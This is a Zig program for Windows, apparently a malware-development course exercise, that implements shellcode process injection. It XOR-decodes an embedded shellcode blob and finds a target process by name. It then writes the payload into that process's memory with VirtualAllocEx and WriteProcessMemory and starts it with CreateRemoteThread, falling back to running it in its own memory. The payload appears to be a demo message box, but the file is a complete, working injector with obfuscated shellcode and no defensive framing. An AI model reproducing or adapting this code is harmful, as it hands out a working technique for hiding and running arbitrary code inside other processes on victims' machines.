// Import required modules
const std = @import("std");
const built = @import("builtin");
const native_arch = built.cpu.arch;
const win = std.os.windows;
const kernel32 = win.kernel32;

const c = @cImport({
    @cInclude("tlhelp32.h");
    @cInclude("tchar.h");
    @cInclude("windows.h");
});

// Define types
const WINAPI = win.WINAPI;
const HANDLE = win.HANDLE;
const DWORD = win.DWORD;
const BOOL = win.BOOL;
const SIZE_T = win.SIZE_T;
const LPVOID = win.LPVOID;
const LPCVOID = win.LPCVOID;
const LPSECURITY_ATTRIBUTES = *win.SECURITY_ATTRIBUTES;
const LPDWORD = *DWORD;
const LPTHREAD_START_ROUTINE = win.LPTHREAD_START_ROUTINE;
const PROCESS_ALL_ACCESS = 0x000F0000 | (0x00100000) | 0xFFFF;
const dwSize = win.dwSize;
const ULONG_PTR = win.ULONG_PTR;
const LONG = win.LONG;
const CHAR = win.CHAR;

// External function declarations
extern "kernel32" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) HANDLE;
extern "kernel32" fn VirtualAllocEx(hProcess: HANDLE, lpAddress: ?LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) callconv(WINAPI) LPVOID;
extern "kernel32" fn WriteProcessMemory(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: *SIZE_T) callconv(WINAPI) BOOL;
extern "kernel32" fn CreateRemoteThread(hProcess: HANDLE, lpThreadAttributes: ?LPSECURITY_ATTRIBUTES, dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: ?LPVOID, dwCreationFlags: DWORD, lpThreadId: ?LPDWORD) callconv(WINAPI) HANDLE;
extern "psapi" fn Process32First(HANDLE, *PROCESSENTRY32) callconv(WINAPI) BOOL;
extern "psapi" fn Process32Next(HANDLE, *PROCESSENTRY32) callconv(WINAPI) BOOL;

// External struct declaration.
pub const PROCESSENTRY32 = extern struct {
    dwSize: DWORD,
    cntUsage: DWORD,
    th32ProcessID: DWORD,
    th32DefaultHeapID: ULONG_PTR,
    th32ModuleID: DWORD,
    cntThreads: DWORD,
    th32ParentProcessID: DWORD,
    pcPriClassBase: LONG,
    dwFlags: DWORD,
    szExeFile: [win.MAX_PATH]CHAR,
};

// Undo XOR operation on the shellcode.
fn crypter(shellcode: []u8, key: u8) void {
    for(shellcode) |*byte| {
        byte.* ^= key;
    }
}

fn getPIDByName(appName: []const u8) ?u32 {
    var hSnapshot: HANDLE = undefined;
    var pe32: PROCESSENTRY32 = undefined;
    var bProcesses: BOOL = undefined;

    // Create a snapshot of all processes.
    // reference: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot, https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
    hSnapshot = kernel32.CreateToolhelp32Snapshot(0x00000002, 0);
    pe32.dwSize = @sizeOf(PROCESSENTRY32);
    
    // Retrieve info about first process in the retrieved snapshot
    // reference: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
    bProcesses = Process32First(hSnapshot, &pe32);

    // For all the next processes check the process name, if equal to chosen process name return
    while (Process32Next(hSnapshot, &pe32) == win.TRUE) {
        var counter: u32 = 0;
        for (pe32.szExeFile) |nameByte| {
            if (nameByte != 0){
                counter = counter+1;
            }else{
                break;
            }
        }

        // Trucate array to only contain process name
        const truncted: []const u8 = pe32.szExeFile[0..counter];

        // Check if given name equals szExeFile (from PROCESSENTRY32), if true return PID
        if ( std.mem.eql(u8, appName, truncted)) {
            return pe32.th32ProcessID;
        }
    }
    // If no process with matching name is found, return null
    return null;
}

fn injectRemote(shellcode: []u8, processID: u32) !void {
    // Allocate memory in the remote process and write shellcode
    const pHandle = OpenProcess(PROCESS_ALL_ACCESS, win.FALSE, processID);
    defer _ = kernel32.CloseHandle(pHandle);
    const rPtr = VirtualAllocEx(pHandle, null, shellcode.len, win.MEM_COMMIT, win.PAGE_EXECUTE_READWRITE);
    
    // Copy the shellcode into the remote process's memory using WriteProcessMemory,
    // and store the number of bytes written in the 'bytesWritten' variable.
    var bytesWritten: SIZE_T = undefined;
    const wSuccess = WriteProcessMemory(pHandle, rPtr, @ptrCast(shellcode.ptr), shellcode.len, &bytesWritten);
    _ = wSuccess;

    // Create a remote thread to execute the shellcode
    const tHandle = CreateRemoteThread(pHandle, null, 0, @ptrCast(rPtr), null, 0, null);
    defer _ = kernel32.CloseHandle(tHandle);
}

// Main function entrypoint
pub fn main() !void {
    // XOR'd shellcode
    var shellcode = [_]u8{ 203, 127, 182, 211, 199, 200, 200, 200, 223, 231, 55, 55, 55, 118, 102, 118, 103, 101, 102, 97, 127, 6, 229, 82, 127, 188, 101, 87, 9, 127, 188, 101, 47, 9, 127, 188, 101, 23, 9, 127, 188, 69, 103, 9, 127, 56, 128, 125, 125, 122, 6, 254, 127, 6, 247, 155, 11, 86, 75, 53, 27, 23, 118, 246, 254, 58, 118, 54, 246, 213, 218, 101, 118, 102, 9, 127, 188, 101, 23, 9, 188, 117, 11, 127, 54, 231, 9, 188, 183, 191, 55, 55, 55, 127, 178, 247, 67, 88, 127, 54, 231, 103, 9, 188, 127, 47, 9, 115, 188, 119, 23, 126, 54, 231, 212, 107, 127, 200, 254, 9, 118, 188, 3, 191, 127, 54, 225, 122, 6, 254, 127, 6, 247, 155, 118, 246, 254, 58, 118, 54, 246, 15, 215, 66, 198, 9, 123, 52, 123, 19, 63, 114, 14, 230, 66, 225, 111, 9, 115, 188, 119, 19, 126, 54, 231, 81, 9, 118, 188, 59, 127, 9, 115, 188, 119, 43, 126, 54, 231, 9, 118, 188, 51, 191, 127, 54, 231, 118, 111, 118, 111, 105, 110, 109, 118, 111, 118, 110, 118, 109, 127, 180, 219, 23, 118, 101, 200, 215, 111, 118, 110, 109, 9, 127, 188, 37, 222, 126, 200, 200, 200, 106, 9, 127, 186, 186, 45, 54, 55, 55, 118, 141, 123, 64, 17, 48, 200, 226, 126, 240, 246, 55, 55, 55, 55, 9, 127, 186, 162, 57, 54, 55, 55, 9, 123, 186, 178, 34, 54, 55, 55, 127, 6, 254, 118, 141, 114, 180, 97, 48, 200, 226, 127, 6, 254, 118, 141, 199, 130, 149, 97, 200, 226, 127, 86, 79, 79, 82, 83, 55, 103, 64, 89, 83, 55, 66, 68, 82, 69, 4, 5, 25, 83, 91, 91, 55 };

    // Get process to target from command line input
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);
    var input = args[1];

    // Function to get the PID by its name, improved over exercise 2.
    const processID: ?u32 = getPIDByName(input);

    // Undo XOR operation on shellcode, make sure to use the right XOR key.
    crypter(&shellcode, 0x37);

    // If process was found inject into this process, otherwise create process and use this
    if (processID != null){
        _ = try injectRemote(&shellcode, processID.?);
    }else {
        std.debug.print("Proc not found, creating new\n",.{});
        _ = try inject_local(&shellcode);
    }
}

// ------------------------------------------------------------

// Code from exercise 1
fn inject_local(shellcode: []u8) !void {
    var executable_memory_space = try win.VirtualAlloc(
        null,
        shellcode.len,
        win.MEM_COMMIT | win.MEM_RESERVE,
        win.PAGE_EXECUTE_READWRITE,
    );

    var executable_memory_ptr = @as([*]u8, @ptrCast(executable_memory_space));
    @memcpy(executable_memory_ptr[0..shellcode.len], shellcode);

    var thread_handle = win.kernel32.CreateThread(
        null, 
        0, 
        @ptrCast(@alignCast(executable_memory_space)),
        null, 
        0, 
        null
    );

    _ = win.kernel32.WaitForSingleObject(
        thread_handle.?,
        win.INFINITE,
    );

    _ = win.kernel32.VirtualFree(
        executable_memory_space,
        0,
        win.MEM_FREE,
    );
    _ = win.CloseHandle(thread_handle.?);
}